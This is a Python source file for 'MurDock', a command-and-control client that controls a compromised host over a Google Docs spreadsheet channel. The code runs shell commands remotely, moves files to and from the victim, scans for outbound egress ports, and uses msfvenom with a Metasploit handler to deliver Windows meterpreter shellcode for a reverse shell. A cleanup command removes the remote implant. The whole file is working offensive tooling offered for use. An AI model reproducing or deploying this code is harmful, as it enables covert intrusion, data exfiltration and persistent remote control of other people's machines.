#!/usr/bin/python
import logging
import os
import sys
import subprocess 
import shlex
import socket
import random
from time import sleep
from hashlib import md5
from gdoc_buffer import gdocClientBuffer
from ast import literal_eval
from string import ascii_uppercase, digits

VERSION = 1.1
BLOCK_SIZE=2**10
DEBUG = False

remote_os = ''
egress_port = ''
sys.stdout = os.fdopen(sys.stdout.fileno(), 'w', 0) # Unbuffered stdout

logger = logging.getLogger('__docCLIENT__')
if not DEBUG:
    logger.setLevel(logging.ERROR)
else:
    logger.setLevel(logging.DEBUG)
ch = logging.StreamHandler()
if not DEBUG:
    ch.setLevel(logging.ERROR)
else:
    ch.setLevel(logging.NOTSET)
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
ch.setFormatter(formatter)
logger.addHandler(ch)


### File Transfer Functions###
def upload(doc_buffer, cmd_str):
    """Upload file to remote host"""
    cmd_list = shlex.split(cmd_str)
    local_path = os.path.expandvars(cmd_list[1].replace('~','$HOME')) # expand & handle ~
    if remote_os == 'Windows':
        remote_path = shlex.split(cmd_str.replace('\\','\\\\'))[2]# pad removal of \ by shlex
    else:
        remote_path = cmd_list[2]
    upload_str = '!upload.' + remote_path.encode('base64','strict').strip('\n')
    local_file_exist = os.path.exists(local_path)

    if local_file_exist:
        try:
            open(local_path,"rb")
            doc_buffer.send_data(upload_str)
        except IOError:
            return "ERROR - local: Can not read to local file: " + local_path
       
        try:
            can_send = doc_buffer.read_data()
        except Exception as e:
            return str(e)
        if can_send == "<OKAYSND>": #can upload?
            try:
                fd = open(local_path,"rb") #open for read
                md5_obj = md5()
                file_size = os.path.getsize(local_path)
                sent_size = 0
                
                data = fd.read(BLOCK_SIZE)
                md5_obj.update(data)
                doc_buffer.send_data("<BOF>." + data.encode('base64','strict') )
                sent_size += BLOCK_SIZE
                if sent_size >= file_size:
                    print "0% .. 100%"
                else:
                    print "0%% .. %3.2F%%  .. " % ( 100 * (sent_size / float(file_size)) ),
                    
                while True:
                    data = fd.read(BLOCK_SIZE)
                    if not data:
                        file_hash = md5_obj.digest().encode('base64','strict')
                        try:
                            doc_buffer.send_data("<EOF>." + file_hash )
                        except Exception as e:
                            return str(e)                  
                        print "Send Complete, waiting for remote integrity check."
                        break
                   
                    #Anti-Clobber
                    to_write = doc_buffer.CLIENT_WRITE_COL + str(doc_buffer.get_to_write())
                    current_data = doc_buffer.get_cell_data(to_write)
                    
                    while(current_data != "<NULL>" and current_data != "<READ>"):
                        print " ... ",
                        sleep(1)
                        current_data = doc_buffer.get_cell_data(to_write)
                                  
                    md5_obj.update(data)    
                    doc_buffer.send_data(data.encode('base64','strict') )
                    sent_size += BLOCK_SIZE
                 
                    if sent_size >= file_size:
                        print " 100%"
                    else:
                        print "%3.2F%%  .. " % ( 100 * (sent_size / float(file_size)) ), 
                try:        
                    integrity_check = doc_buffer.read_data()
                except Exception as e:
                    return str(e)   
                if  integrity_check == "<OKAYRCV>":
                    return "\nFile transfered successfully, integrity verified."
                elif integrity_check == "<OKAYFAIL>":
                    return "ERROR -remote: Remote integrity check failed, deleting remote file."                    
            except IOError:
                return "ERROR - local: can not read file : " + local_path
        else:
            return "ERROR - remote: Remote path: " + remote_path + " does not exist or insufficient permissions." 
            
    elif not local_file_exist:
        return "ERROR - local: Local File: " +  local_path + " does not exist."


def download(doc_buffer, cmd_str):
    """Download remote file to local host"""
    cmd_list = shlex.split(cmd_str)
    if remote_os == 'Windows':
        remote_path = shlex.split(cmd_str.replace('\\','\\\\'))[1] # pad removal of \ by shlex
    else:
        remote_path = cmd_list[1]
    local_path = os.path.expandvars(cmd_list[2].replace('~','$HOME')) # expand paths and handle ~ shortcut
    tmp_file = local_path + ".tmp"   
    download_str = '!download.' + remote_path.encode('base64','strict').strip('\n')
    can_rcv = ''
    exist_before = os.path.exists(local_path)
    
    try:  #can write local_path?
        open(local_path,"wb")
        doc_buffer.send_data(download_str)
    except IOError:
        return "ERROR: Can not write to local file: " + local_path
    
    try:
        can_rcv = doc_buffer.read_data()
    except Exception as e:
        return str(e)
        
    if can_rcv.startswith("<OKAYRCV>"):  
        try:
            fd = open(tmp_file, "wb")
            md5_obj = md5()
            file_size = int( can_rcv.split(".")[1] )
            rcv_size = 0

            try: #first block read
                raw_data = doc_buffer.read_data()
            except Exception as e:
                return str(e)
            data_lst = raw_data.split('.')
            if data_lst[0] != "<BOF>":
                doc_buffer.last_read_update( doc_buffer.get_to_read() )
                return "ERROR: download() - Data BOF format error."
            bin_data = data_lst[1].decode('base64','strict') 
            fd.write(bin_data)      
            md5_obj.update(bin_data)
            rcv_size += BLOCK_SIZE
            if rcv_size >= file_size:
                print " 100%"
            else:
                print "%3.2F%%  .. " % ( 100 * (rcv_size / float(file_size)) ), 
            
            while bin_data != "<EOF>" :
                try:
                    bin_data = doc_buffer.read_data()
                except Exception as e:
                    return str(e)
                
                if bin_data == "<READ>" or bin_data == "<NULL>": #should never get these from the read_data method
                    pass 
                elif bin_data.startswith("<EOF>"):
                    fd.close()
                    data_lst = bin_data.split(".")
                    bin_data = data_lst[0]
                    file_hash = data_lst[1]
                    doc_buffer.last_read_update( doc_buffer.get_to_read() ) #solves OBO error in transfer logic, not BEST solution
                    if file_hash == md5_obj.digest().encode('base64','strict'):
                        if os.path.exists(local_path):
                            os.remove(local_path)
                        os.rename(tmp_file, local_path)
                        return "\nFile transfered successfully, integrity verified." 
                    else:
                        if os.path.exists(tmp_file):
                            os.remove(tmp_file)
                        return "ERROR: Integrity check failed, deleting temp file."      
                else:      
                    bin_data = bin_data.decode('base64','strict')
                    fd.write(bin_data)
                    md5_obj.update(bin_data)
                    rcv_size += BLOCK_SIZE
                    if rcv_size >= file_size:
                        print " 100%"
                    else:
                        print "%3.2F%%  .. " % ( 100 * (rcv_size / float(file_size)) ),                           
        except IOError:
            return "ERROR: Cannot write to file: " + tmp_file
    else:
        if not exist_before:
            os.remove(local_path)
        return "ERROR: remote path does not exist or insufficient permissions." 



### SHELL UPGRADES ###
def egress_bust(doc_buffer):
    """Find egress port out of remote network
    
    Menu interface to select means to check for egress TCP port
    Port checked against provided IPV4 address
    To update topPorts file: 
    sort -r -n -k 3 /<pathto>/nmap-services | grep -i tcp | awk '{print $2}' | cut -d/ -f1 > /<docDoorPath>/top-ports
    TODO: Add UDP and IPv6 
    """
    target_ip = ''
    port_list = ''
    top_ports_path = "../top-ports"
    min_port = 0
    max_port = 65535
    threads = 0
    global egress_port
    
    print "\n *** Choose an egress method (TCP only) ***\n"
    method = 99
    while method not in range(1, 6):
        print "1. Check a X ports by % prevalence in nmap-service file. (X)"
        print "2. Check a given range of ports. (X-Y)"
        print "3. Enter comma delimited list of ports. (X,Y,Z,A,F,B,J...)"
        print "4. Print stored egress port for this session"
        print "5. No thanks... return to shell"
        try:
            method = int(raw_input('Method (1-5): '))
        except:
            method = 99           
    if method == 1: # top X
        top_ports_count = 0
        try:
            with open(top_ports_path) as f:
                top_ports_count = sum(1 for line in f)
        except:
            print "ERROR: Top Ports File missing"
            return 
        print "\nTry top X ports in the NMAP services file."
        port_count = 0  
        while port_count not in range (1, top_ports_count + 1):
            if port_count > top_ports_count:
                print "\n*** Only %s ports are available. ***" % top_ports_count
            print "How many ports would you like to check?"
            try:
                port_count = int(raw_input('Check: '))
            except:
                port_count = 0
        with open(top_ports_path, 'r') as port_file:
            port_list = [port_file.next() for line in xrange(port_count)]
        port_list = ','.join([nl.rstrip() for nl in port_list])     
    elif method == 2:# port range
        min_choice = -1; max_choice = 99999
        while min_choice < min_port or max_choice > max_port or min_choice > max_choice:
            if min_choice < min_port or max_choice > max_port or min_choice > max_choice:
                print "\n*** Out of Bounds: Min=0  Max=65535 ***"
            print "Scan port range Min - Max?"
            try:
                min_choice = int(raw_input('Min Port: '))
                max_choice = int(raw_input('Max Port: '))
            except:
                min_choice = -1
                max_choice = 99999
        port_list = "%s-%s" % (min_choice, max_choice)
    elif method == 3: # custom list
        is_valid = False
        while not is_valid:
            print "\nEnter comma separated port list. (X,Y,Z,A,F,B,J...)"
            try:
                port_list = raw_input('List: ').strip().split(",")
                for port in port_list:
                    port = int(port)
                    if port < min_port or port > max_port:
                        print "\n *** Error - Invalid port in range: %s" % port
                        is_valid = False
                        break
                    else:
                        is_valid = True
            except Exception, e:
                print e
                is_valid = False    
        port_list = ','.join(list(set(port_list)))
    elif method == 4:
        if egress_port:
            return """
            *** Stored Egress Port for Session ***"
                Port: """ + egress_port + """ 
                We suggest confirming with egress method #3.
            """ 
        else:
            return """
            *** No known Egress Ports ***
     Egress Port clears on session init and !sync
            """
    else:
        print "\n"
        return ""
    
    while target_ip == '':
        try:
            target_ip = raw_input('\nExternal Egress Target IPv4 Address: ')
            socket.inet_aton(target_ip)
        except socket.error:
            print "\n*** Invalid IP Address ***"
            target_ip = ''
    while threads < 1:
        try:
            threads = int(raw_input('\nWorker Threads (default 10): '))
            threads = str(threads)
        except:
            print "Default 10 threads being used."
            threads = '10'  
    
    is_correct = ''
    while is_correct == '':
        print "\n*** Confirm Egress Data ***"
        print "Target IP :  %s" % target_ip
        tmp_list = []
        if "-" in port_list:
            min_port, max_port = port_list.split("-")
            tmp_list = list(( str(port) for port in range(int(min_port), int(max_port) + 1) ))
        else:
            tmp_list = port_list.split(",")    
        print "Ports Count : %s" % len(tmp_list)
        print "Thread Count: %s" % threads
        try:
            is_correct = str(raw_input('\nLaunch Check (y/n): ')).lower()
            if is_correct.startswith('y'):
                is_correct = 'yes'
            elif is_correct.startswith('n'):
                is_correct = 'no'
                return "\n*** Egress check cancelled ***\n"
            else:
                is_correct = ''       
        except:
            is_correct = ''

    egress_cmd = "!egress|" + port_list + "|" + target_ip + "|" + threads
    logger.debug(egress_cmd)
    print "\n*** Delivering Request to remote host ***"
    doc_buffer.send_data(egress_cmd)
    try:
        while 1:
            try:
                srv_response = doc_buffer.read_data()
            except Exception as e:
                if str(e) == "READ ERROR: Connection timed out.":
                    logger.debug("executing continue on : " + str(e) )
                    continue
                else:
                    logger.debug("returning with error of: " + str(e) )
                    return str(e)
            if srv_response.startswith("<egress>"):
                egress_list = srv_response.split(".")
                if  egress_list[1] == "<started>":
                    print "\n*** Range accepted ***"
                    print "Searching %s ports with %s worker threads." % (egress_list[2].strip("<>"), threads)
                    print "This may take a while..."
                elif egress_list[1] == "<failed>":
                    return "\n*** ERROR: Egress Check Failed ***"
                elif egress_list[1] == "<open>":
                    egress_port = egress_list[2].strip("<>")
                    return "\n*** OPEN - Egress port: %s ***\n" % egress_port    
                elif egress_list[1] == "<closed>":
                    return "\n*** CLOSED - All checked ports closed ***\n"
    except KeyboardInterrupt:
        print "Interrupt caught.\n"
        return
    

def meter_up(doc_buffer):
    """Upgrade control to meterpreter shell, leverages msfvenom"""
    ip = ''
    port = ''
    is_handler = ''
    payload = ''
    is_correct = 'no'
    
    venom_path = local_cmd("which msfvenom").rstrip('\r\n')
    payload_path = local_cmd("which msfpayload").rstrip('\r\n')
    if not venom_path or not payload_path:
        return "\n*** ERROR: msfvenom or msfpayload not found, exiting !meterup ***"
    if os.lower() != "windows":
        return "\n*** ERROR: victim not Windows platform, exiting !meterup ***"
    
    print "\n*** Interactive meterpreter Upgrade ***"
    while is_correct == 'no':
        print "\nHint - Local IP: " + local_cmd("hostname -I").strip("\n") + " - External IP: <>" #TODO: Add query for external IP address
        while ip == '':
            try:
                ip = str(raw_input('LHOST IP Address ?: '))
            except:
                ip = ''         
        print "\nHint - use !egress to acquire ports."
        if not egress_port == '':
            print "Known OPEN: %s" % egress_port    
        while port == '':
            try:
                port = str(raw_input('LPORT Port Number ?: '))
            except:
                port = ''                  
        while payload == '':#msfpayload to list payloads      
            print "\nGenerating Payload List... "
            try:
                payloads_list = subprocess.check_output("msfpayload -l | grep -e 'windows.*\/meterpreter'" + \
                                                      " | awk {'print $1'}", shell=True).strip("\t").splitlines()
                for index, pload in enumerate(payloads_list):
                    print index, pload
                payload = str(raw_input('\nPlease select a payload by number (#): '))    
                
                try:
                    payload = payloads_list[int(payload)]
                except ValueError:
                    payload = ''        
            except:
                payload = ''
        print "\nAutomatically spawn handler... ?"
        print "Assumes a graphical environment with x-terminal-emulator.\n"       
        while not (is_handler == "yes" or is_handler == "no"):
            try:
                is_handler = str(raw_input('Handle Shell?(Y/n): ')).lower()
                if is_handler.startswith('y'):
                    is_handler = "yes"
                elif is_handler.startswith('n'):
                    is_handler = "no"
            except:
                is_handler = ''              
        valid = ['yes', 'no', 'exit']
        is_correct = ''
        while is_correct not in valid:
            print "\nIs the below information correct? "
            print "LHOST: " + ip + "\nLPORT: " + port + "\nPayload: " + payload + "\nHandler: " + is_handler   
            try:
                is_correct = str(raw_input('Y/N or exit(to cancel): ')).lower()
                if is_correct.startswith('y'):
                    is_correct = 'yes'
                elif is_correct.startswith('n'):
                    is_correct = 'no'
                    ip = ''
                    port = ''
                    payload = ''
                    is_handler = ''
                    clear_local()
                elif is_correct == "exit":
                    print "Operation cancelled."
                    return       
            except:
                is_correct = 'no'
    
    if is_handler == "yes":
        print "\n\nOpening multi-handler for IP: " + ip + " on port: " + port
        handler_file_data = "use exploit/multi/handler/\n" + \
            "set payload " + payload + "\n" + \
            "set LHOST " + ip + "\n"  + \
            "set LPORT " + port + "\n"  + \
            "set ExitOnSession false\n"  + \
            "set EnableStageEncoding true\n"  + \
            "exploit -j\n"
        rand_path = ''.join(random.choice(ascii_uppercase + digits) for char in range(12))
        handler_path = rand_path + ".rc" 
        while os.path.exists(handler_path):
            rand_path = ''.join(random.choice(ascii_uppercase + digits) for char in range(12))
            handler_path = rand_path + ".rc" 
        try:
            fd = open(handler_path,"wb")
            fd.write(handler_file_data)
            fd.close()
        except IOError:
            return "ERROR: can not write handler resource file."
        logger.debug('creating file ./%s' % handler_path)
        command = "msfconsole -r ./%s" % handler_path
        #command = "msfcli exploit/multi/handler PAYLOAD=" + payload + " LHOST=" + ip + " LPORT=" + port + " E"
        command = 'sudo /bin/bash -l -c "' + command + '"'
        command = "x-terminal-emulator -e '" + command + "'" 
        subprocess.Popen(shlex.split(command))
        
        handler_up = ''
        while handler_up != 'yes':
            try:
                handler_up = str(raw_input('\nHandler ready? Y/(N to exit): ')).lower()
                if handler_up.startswith('y'):
                    handler_up = 'yes'
                elif handler_up.startswith('n'):
                    return "*** Handler Error: !meterup cancelled ***"   
                else:
                    handler_up = '' 
            except:
                handler_up = ''        
        
    print "\n\nGenerating shellcode Byte Array with msfvenom"
    shellcode = local_cmd(venom_path + " -p " + payload + " LPORT=" + port + " LHOST=" + ip + " -f raw")
    print "Delivering payload... "
    try:
        if is_handler == "yes":
            try:
                os.remove(handler_path)
            except OSError:
                logger.debug('Failed to remove handler file')
            doc_buffer.send_data("!meterup." + shellcode.encode("base64", "strict") )
        return doc_buffer.read_data()
    except:
        if is_handler == "yes":
            try:
                os.remove(handler_path)
            except OSError:
                logger.debug('Failed to remove handler file')
        return "failed to send shell code"               


def forward_port(doc_buffer):
    return "*** ERROR: Removed from public release ***\n"


def local_cmd(command_in):
    """Executes commands on local system
   
    Assumes Linux host 
    parse bases on "" all following space input to pipe 
    """
    try:
        process = subprocess.Popen(command_in, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        output = process.communicate() #TODO: Change to stdout, stderr = process.communicate() for clarity   
        if output[1] == '':
            return output[0]
        if output[0] and output[1]:
            return output[0] + output[1]
        else:
            return output[1]
    except OSError as e:
        return "\nERROR: OSError: %s" % e.msg


### HELPER FUNCTIONS ###

def intro_print():
    """Print Main Menu."""
    print """
        ~ MurDock v%s beta ~
        Author: Themson Mester
        Release: Public
        License: MIT
        EULA: Be Excellent to each other
        Help: !help
    """ % VERSION
    

def help_print():
    """Print local Help Menu. Provide command format."""
    print """
      ~ MurDock v%s Public ~
      *** commands ***
      !help     - Print this help menu : (!h)
      !clear    - Clear local terminal : (!c)
      !watch    - Looped listener for incoming shells              
      !cmd      - Execute local command - Usage : !cmd <command string>
      !sysinfo  - Print System info of remote host
              
      !upload   - Usage : !upload <local_file_path> <remote_file_path>
      !download - Usage : !download <remote_file_path> <local_file_path>
                  
      !egress   - Find egress ports out of remote network - Interactive
      !meterup  - Upgrade to meterpreter shell - Interactive
      !forward  - Forward local socket to remote socket - (disabled)
        
      !sync     - Synchronize buffers with remote server  
      !shutdown - Shutdown remote docServer. Does not remove binary
      !cleanup  - Shutdown remote docServer and remove binary
      !exit     - Exit Local client only
        
      <:        - Send command to remote server
    """ % VERSION
    

def clear_local():
    """Clear local shell buffer."""
    print "\n" * 1000
   


def send_shutdown(doc_buffer):
    """Send shutdown signal to remote server. Currently leaves bin behind."""
    affirmatives = ["y", "yes"]
    negatives = ["n", "no"]
    choice = ''
    
    print " *** Warning: Don't be Sloppy! ***"
    print "You are about to shut down the remote server, leaving behind a binary."
    
    while choice == '': 
        try: #handle non-string types
            choice = str(raw_input('Want to Be Sloppy? Y/N: '))
        except:
            choice = ''
            
        if choice.lower() in affirmatives:
            print "Sending shutdown signal: ",
            doc_buffer.send_data("!shutdown")
            srv_response = doc_buffer.read_data()
            if srv_response == "<GOTSHUT>":
                print "\n*** Remote server has been shut down. ***"
                return
            else:
                print " *** Error: Remote Shutdown Failed *** "
                print "If server is non-responsive there may be no resolution."
                print "If server is responsive but out of synch, issue the !synch command before shutting down."
                return
        elif choice.lower() in negatives:
            return
        else:
            choice = ''


def clean_up(doc_buffer):
    """Send cleanup signal
    
    Remove server from remote host, shuts down and deletes files
    Closes local client.
    """
    affirmatives = ["y", "yes"]
    negatives = ["n", "no"]
    choice = ''
    
    if os.lower() != "windows":
        print "\n*** Removal method not yet available for %s ***\n" % remote_os
        return
    
    print """\n                   *** WARNING ***"
        This feature is blind, there will be no feedback once executed.
        You are about to SHUT DOWN the remote server, and REMOVE the binary."""
        
    while choice == '': #handle non-string types
        try:
            choice = str(raw_input('\nAre you sure you want to CLEANUP now? Y/N: '))
        except:
            choice = ''     
        if choice.lower() in affirmatives:
            print "Sending CLEANUP signal... "
            doc_buffer.send_data("!cleanup")
            print "\nAnd like that, "#TODO: Add a read_data() confirmation here
            sleep(3)
            clear_local()    
            print """
                    .(  . * .
                  .*  .      ) .
                 .. He's gone .*.
                  '* . (    .) '
                   ` ( *  . *
            """
            return         
        elif choice.lower() in negatives:
            return
        else:
            choice = ''
    

def exit_client():
    """Print exit info and exit local client."""
    print """
            ~ Exited Local MurDock Client ~
                
            WARNING: 
            This does NOT terminate the remote server.
            """
    sys.exit()


def sysinfo(doc_buffer):
    """Retrieve remote system info. Print and return data as list"""
    print "\nPolling Remote Host for !sysinfo..."
    doc_buffer.send_data("!sysinfo")
    try:
        sysdata = literal_eval(doc_buffer.read_data())
    except Exception as e:
        print str(e)
        exit_client()
    print "\n\n*** Remote System Info ***"
    for worker in sysdata:
        print worker
    print ''      
    return sysdata


def sync_up(doc_buffer):
    """Synchronize buffers
    
    Align sequence numbers etc per protocol wrapper
    Print and store system info from remote system
    SetsRemote remote_os global var
    """
    global remote_os
    global egress_port
    egress_port = ''
    if doc_buffer.sync_up():
        print "\n *** Connection with compromised host synchronized. ***"
        sysdata = sysinfo(doc_buffer)
        remote_os = sysdata[0].split(":")[1].strip(" ")
        return True
    else:
        return False      


def watch_new(doc_buffer):
    """Watch for new server connections
    
    use sync_up() bool in loop to watch for server
    stop on True or KeyboardInterrupt
    """
    delay = 5
    print "\n *** Listening for compromised hosts ***"
    print "Exit listener with keyboard interrupt: ^c"
    try:
        while not sync_up(doc_buffer):
            if delay > 30:
                delay = 30
            sleep(delay)
            delay += 5
    except KeyboardInterrupt:
        print "Interrupt caught, watcher terminated\n"
        return
            
   
def main():     
    intro_print() # banner
    try:  
        doc_buffer = gdocClientBuffer() # Instantiate buffer object
    except Exception as e:
        print "*** ERROR: Failed to instantiate buffer. *** - " + str(e)
        exit_client()
           
    shell_input = ''
    while (shell_input != '!exit'): # primary input/send/read/output loop
        shell_input = ''
        while shell_input == '': # handle non-string types
            try:
                shell_input = str(raw_input('<: '))
                logger.debug("Main() shell_input set: " + shell_input)
            except:
                shell_input = ''
       
        menu_drvn_cmds = [
                          '!help', '!h', '!clear', '!c','!watch',
                          '!sysinfo','!egress', '!meterup', '!forward',
                          '!sync', '!exit', '!shutdown', '!cleanup'
                          ]
        parsed_cmds = ['!cmd ', '!upload','!download',]
        if shell_input.startswith('!') and shell_input in menu_drvn_cmds: #TODO: MOVE TO COMMAND PROCESSOR Function
            if shell_input == '!help' or shell_input == '!h':
                help_print()
            elif shell_input == '!clear' or shell_input == '!c':
                clear_local()
            elif shell_input == '!watch':
                watch_new(doc_buffer)  
            elif shell_input == "!sysinfo":
                sysinfo(doc_buffer)
            elif shell_input == "!egress":
                print egress_bust(doc_buffer)
            elif shell_input == '!meterup':
                print meter_up(doc_buffer)
            elif shell_input == '!forward':
                print forward_port(doc_buffer)
            elif shell_input == '!sync':
                print "Attempting to synchronize with remote host server."
                if not sync_up(doc_buffer):
                    print "\n*** SYNC FAILED: No server or Lost Auth ***" 
                    exit_client()        
            elif shell_input == '!exit':
                exit_client()
            elif shell_input == "!shutdown":
                send_shutdown(doc_buffer)
            elif shell_input == "!cleanup":
                clean_up(doc_buffer)
            
        #Parse Exec        
        elif shell_input.startswith('!cmd '):
            print local_cmd( shell_input.split(" ", 1)[1] )           
        elif shell_input.startswith('!upload'):
                print upload(doc_buffer, shell_input)
        elif shell_input.startswith('!download'):
                print download(doc_buffer, shell_input)
        
        #Handle invalid builtins
        elif (
              shell_input.startswith('!') and
              (shell_input not in menu_drvn_cmds) and
              (shell_input not in parsed_cmds)
              ):
            print "Built-in command \"" + shell_input + "\" not found."

        
        else: #Raw cmd and read to remote host 
            doc_buffer.send_data(shell_input) #TODO: may need to wrap in try except
            try:
                srv_data = doc_buffer.read_data()
                print "\n" + srv_data + "\n"
            except Exception as e:
                print str(e)
     
            
if __name__ == "__main__":
    main()
